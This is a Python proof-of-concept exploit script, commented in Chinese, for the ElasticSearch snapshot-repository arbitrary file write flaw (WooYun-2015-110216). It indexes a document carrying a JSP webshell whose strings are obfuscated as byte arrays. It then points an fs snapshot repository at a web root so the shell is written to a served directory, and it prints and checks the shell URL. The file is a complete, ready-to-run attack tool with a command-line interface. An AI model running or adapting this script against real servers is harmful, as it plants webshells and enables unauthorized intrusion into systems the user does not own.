#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
ElasticSearch 任意文件上传漏洞 POC (WooYun-2015-110216)
使用备份仓库功能向任意目录写入文件，配合 Web 服务（如 Tomcat）可获取 WebShell。
"""

import requests
import json
import sys
import argparse
import time

# 默认 JSP Shell：接收参数 f，将内容写入 /test.jsp (Web 根目录)
DEFAULT_JSP = (
    '<%new java.io.RandomAccessFile(application.getRealPath(new String(new byte[]{47,116,101,115,116,46,106,115,112})),'
    'new String(new byte[]{114,119})).write(request.getParameter(new String(new byte[]{102})).getBytes());%>'
)

def exploit(es_url, web_root, web_url, index='shell', snapshot='shell.jsp', jsp_code=None, timeout=10):
    """
    执行漏洞利用
    :param es_url: ElasticSearch 基础 URL，如 http://127.0.0.1:9200
    :param web_root: Web 目录绝对路径（仓库 location），如 /usr/local/tomcat/webapps/wwwroot/
    :param web_url: 该目录对应的 Web 访问 URL 前缀，如 http://127.0.0.1:8080/wwwroot/
    :param index: 索引名称，默认 shell
    :param snapshot: 快照名称，默认 shell.jsp（最终文件名为 snapshot-shell.jsp）
    :param jsp_code: 自定义 JSP 代码，若不指定则使用默认
    :param timeout: 请求超时（秒）
    :return: 成功返回 Shell 访问 URL，失败返回 None
    """
    if jsp_code is None:
        jsp_code = DEFAULT_JSP

    # 1. 创建恶意索引文档
    doc = {jsp_code: "test"}
    doc_url = f"{es_url}/{index}/doc/1"  # 索引/类型/ID，类型固定为 doc
    try:
        resp = requests.put(doc_url, json=doc, timeout=timeout)
        if resp.status_code not in (200, 201):
            print(f"[!] 创建索引文档失败: {resp.text}")
            return None
        print(f"[+] 索引文档创建成功: {doc_url}")
    except Exception as e:
        print(f"[!] 请求异常: {e}")
        return None

    # 2. 创建备份仓库（如果已存在则先删除）
    repo_name = "backup_repo"
    repo_url = f"{es_url}/_snapshot/{repo_name}"
    # 尝试删除旧仓库（忽略错误）
    try:
        requests.delete(repo_url, timeout=timeout)
    except:
        pass

    repo_body = {
        "type": "fs",
        "settings": {
            "location": web_root,
            "compress": False
        }
    }
    try:
        resp = requests.put(repo_url, json=repo_body, timeout=timeout)
        if resp.status_code not in (200, 201):
            print(f"[!] 创建仓库失败: {resp.text}")
            return None
        print(f"[+] 仓库创建成功: {repo_url}")
    except Exception as e:
        print(f"[!] 请求异常: {e}")
        return None

    # 3. 执行快照，将索引数据写入仓库
    snapshot_url = f"{es_url}/_snapshot/{repo_name}/{snapshot}?wait_for_completion=true"
    snapshot_body = {
        "indices": index,
        "ignore_unavailable": True,
        "include_global_state": False
    }
    try:
        resp = requests.put(snapshot_url, json=snapshot_body, timeout=timeout)
        if resp.status_code not in (200, 201):
            print(f"[!] 创建快照失败: {resp.text}")
            return None
        print(f"[+] 快照创建成功: {snapshot_url}")
    except Exception as e:
        print(f"[!] 请求异常: {e}")
        return None

    # 4. 构造 Shell 访问 URL
    # 实际文件路径：{web_root}/indices/{index}/snapshot-{snapshot}
    shell_url = f"{web_url}indices/{index}/snapshot-{snapshot}"
    print(f"[+] Shell 上传成功！访问地址: {shell_url}")
    print(f"[*] 使用示例: {shell_url}?f=hello  (向 /test.jsp 写入 hello)")

    # 可选：验证文件是否可访问
    try:
        check_resp = requests.get(shell_url, timeout=timeout)
        if check_resp.status_code == 200:
            print("[+] 验证通过，Shell 可访问。")
        else:
            print(f"[!] 验证访问返回状态码: {check_resp.status_code}，可能未被正确解析，请手动检查。")
    except Exception as e:
        print(f"[!] 验证访问异常: {e}")

    return shell_url

def main():
    parser = argparse.ArgumentParser(description="ElasticSearch 任意文件上传漏洞 POC (WooYun-2015-110216)")
    parser.add_argument("--es-url", default="http://127.0.0.1:9200", help="ElasticSearch 服务地址 (默认 http://127.0.0.1:9200)")
    parser.add_argument("--web-root", required=True, help="Web 目录绝对路径，例如 /usr/local/tomcat/webapps/wwwroot/")
    parser.add_argument("--web-url", required=True, help="Web 目录访问 URL 前缀，例如 http://127.0.0.1:8080/wwwroot/")
    parser.add_argument("--index", default="shell", help="索引名称 (默认 shell)")
    parser.add_argument("--snapshot", default="shell.jsp", help="快照名称 (默认 shell.jsp，最终文件为 snapshot-<快照名>)")
    parser.add_argument("--jsp-file", help="包含自定义 JSP 代码的文件路径 (若不指定则使用内置默认)")
    parser.add_argument("--timeout", type=int, default=10, help="请求超时秒数 (默认 10)")
    args = parser.parse_args()

    jsp_code = None
    if args.jsp_file:
        try:
            with open(args.jsp_file, 'r', encoding='utf-8') as f:
                jsp_code = f.read().strip()
        except Exception as e:
            print(f"[!] 读取 JSP 文件失败: {e}")
            sys.exit(1)

    exploit(
        es_url=args.es_url,
        web_root=args.web_root,
        web_url=args.web_url,
        index=args.index,
        snapshot=args.snapshot,
        jsp_code=jsp_code,
        timeout=args.timeout
    )

if __name__ == "__main__":
    main()